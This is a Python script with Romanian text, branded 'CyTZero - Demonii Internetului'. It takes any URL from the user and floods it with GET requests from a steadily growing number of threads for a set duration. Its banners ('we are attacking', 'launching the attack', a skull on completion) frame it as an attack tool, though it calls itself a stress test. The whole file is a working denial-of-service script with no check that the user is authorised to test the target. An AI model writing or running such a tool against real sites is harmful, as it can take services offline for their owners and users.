import threading
import requests
import time
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.panel import Panel
from rich.text import Text
from rich.theme import Theme

# Configurare tematică Rich pentru efecte dramatice
custom_theme = Theme({
    "warning": "bold red",
    "info": "bold cyan",
    "success": "bold green",
    "error": "bold magenta",
    "highlight": "bold red reverse",
})
console = Console(theme=custom_theme)

def send_request(url):
    """
    Trimite o cerere HTTP GET la URL-ul specificat.
    """
    try:
        response = requests.get(url, timeout=5)
        console.log(f"[success][+][/success] [info]Răspuns {response.status_code}[/info] de la [bold cyan]{url}[/bold cyan]")
    except requests.exceptions.RequestException as e:
        console.log(f"[error][-][/error] [warning]Eroare: {e}[/warning]")

def stress_test(url, num_threads, duration):
    """
    Realizează testarea cu număr specificat de fire și durată.
    """
    console.print(
        Panel(
            Text(f"Pregătește-te! Atacăm {url} cu {num_threads} fire pentru {duration} secunde", justify="center"),
            border_style="red",
            title="[highlight]Testare Începută[/highlight]",
        )
    )

    start_time = time.time()
    threads = []

    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[warning]{task.description}[/warning]"),
        BarColumn(bar_width=None, style="red"),
        console=console
    ) as progress:
        task = progress.add_task("🔥 Lansez atacul...", total=None)
        while time.time() - start_time < duration:
            for _ in range(num_threads):
                thread = threading.Thread(target=send_request, args=(url,))
                threads.append(thread)
                thread.start()
            time.sleep(0.1)  # Evităm supraîncărcarea sistemului
        progress.remove_task(task)

    for thread in threads:
        thread.join()
    
    console.print(
        Panel(
            Text("💀 Atacul s-a terminat. Rezistența serverului a fost testată.", justify="center"),
            border_style="red",
            title="[highlight]Finalizat[/highlight]",
        )
    )

if __name__ == "__main__":
    console.print(
        Panel(
            """
[bold red]███████╗██╗   ██╗████████╗███████╗██████╗ ███████╗ ██████╗ 
██╔════╝██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔═══██╗
███████╗██║   ██║   ██║   █████╗  ██████╔╝█████╗  ██║   ██║
╚════██║██║   ██║   ██║   ██╔══╝  ██╔══██╗██╔══╝  ██║   ██║
███████║╚██████╔╝   ██║   ███████╗██║  ██║███████╗╚██████╔╝
╚══════╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ [/bold red]
            """,
            border_style="bold red",
            title="[bold black on red] CyTZero - Demonii Internetului [/bold black on red]",
        )
    )
    
    # Introducerea parametrilor
    url = console.input("[warning]Introdu URL-ul site-ului de testat: [/warning]").strip()
    num_threads = int(console.input("[warning]Numărul de fire de execuție (ex: 10): [/warning]"))
    duration = int(console.input("[warning]Durata testului (în secunde): [/warning]"))

    # Lansarea testului
    stress_test(url, num_threads, duration)
